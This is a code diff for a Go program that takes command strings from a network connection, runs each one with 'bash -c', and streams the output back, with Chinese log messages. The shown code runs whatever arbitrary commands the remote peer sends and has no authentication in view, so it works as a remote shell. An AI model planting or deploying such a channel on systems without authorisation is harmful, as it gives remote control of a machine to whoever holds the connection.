@@ -5,10 +5,11 @@ import (
     "flag"
     "fmt"
     "net"
-    //"os"
     "os/exec"
     "strings"
     "time"
+    "sync"
+    "io"
 )
 
 var (
@@ -75,108 +76,60 @@ func receiveMessages(conn net.Conn) {
             writer.Flush()
             continue
         }
+        fmt.Printf("收到命令: %s\n", message)
         go executeCommandAndStreamOutput(message, writer)
     }
 }
 
 func executeCommandAndStreamOutput(command string, writer *bufio.Writer) {
-    cmd := exec.Command("sh", "-c", command)
+    fmt.Fprintf(writer, "SERVERANDCLIENTSTB\n")
+    writer.Flush()
+
+    cmd := exec.Command("bash", "-c", command)
     stdout, err := cmd.StdoutPipe()
     if err != nil {
-        fmt.Fprintf(writer, "创建StdoutPipe失败: %v\n<EOF>\n", err)
+        fmt.Fprintf(writer, "创建StdoutPipe失败: %v\n<SERVERANDCLIENTEOF>\n", err)
         writer.Flush()
         return
     }
+    defer stdout.Close()
+
     stderr, err := cmd.StderrPipe()
     if err != nil {
-        fmt.Fprintf(writer, "创建StderrPipe失败: %v\n<EOF>\n", err)
+        fmt.Fprintf(writer, "创建StderrPipe失败: %v\n<SERVERANDCLIENTEOF>\n", err)
         writer.Flush()
         return
     }
+    defer stderr.Close()
 
     if err := cmd.Start(); err != nil {
-        fmt.Fprintf(writer, "命令启动失败: %v\n<EOF>\n", err)
+        fmt.Fprintf(writer, "命令启动失败: %v\n<SERVERANDCLIENTEOF>\n", err)
         writer.Flush()
         return
     }
 
+    var wg sync.WaitGroup
+    wg.Add(2)
+
     go func() {
-        scanner := bufio.NewScanner(stdout)
-        for scanner.Scan() {
-            line := scanner.Text()
-            fmt.Fprintf(writer, "%s\n", line)
-            writer.Flush()
-        }
+        defer wg.Done()
+        io.Copy(writer, stdout)
+        writer.Flush()
     }()
 
     go func() {
-        scanner := bufio.NewScanner(stderr)
-        for scanner.Scan() {
-            line := scanner.Text()
-            fmt.Fprintf(writer, "%s\n", line)
-            writer.Flush()
-        }
+        defer wg.Done()
+        io.Copy(writer, stderr)
+        writer.Flush()
     }()
 
-    cmd.Wait()
-    fmt.Fprintf(writer, "<EOF>\n")
+    wg.Wait()
+
+    err = cmd.Wait()
+    if err != nil {
+        fmt.Fprintf(writer, "命令执行失败: %v\n", err)
+    }
+
+    fmt.Fprintf(writer, "<SERVERANDCLIENTEOF>\n")
     writer.Flush()
 }
-
-
-
-
-
-
-
-func executeCommand(command string) string {
-    parts := strings.Fields(command)
-    if len(parts) == 0 {
-        return ""
-    }
-
-    cmd := exec.Command(parts[0], parts[1:]...)
-    stdout, err := cmd.StdoutPipe()
-    if err != nil {
-        return fmt.Sprintf("创建StdoutPipe失败: %v\n<EOF>", err)
-    }
-    stderr, err := cmd.StderrPipe()
-    if err != nil {
-        return fmt.Sprintf("创建StderrPipe失败: %v\n<EOF>", err)
-    }
-
-    if err := cmd.Start(); err != nil {
-        return fmt.Sprintf("命令启动失败: %v\n<EOF>", err)
-    }
-
-    reader := bufio.NewReader(stdout)
-    readerErr := bufio.NewReader(stderr)
-    var response strings.Builder
-
-    go func() {
-        for {
-            line, err := reader.ReadString('\n')
-            if err != nil {
-                break
-            }
-            response.WriteString(line)
-            fmt.Println(line) // 流式输出到服务端
-        }
-    }()
-
-    go func() {
-        for {
-            line, err := readerErr.ReadString('\n')
-            if err != nil {
-                break
-            }
-            response.WriteString(line)
-            fmt.Println(line) // 流式输出到服务端
-        }
-    }()
-
-    cmd.Wait()
-    return fmt.Sprintf("%s<EOF>", response.String())
-}
-
-
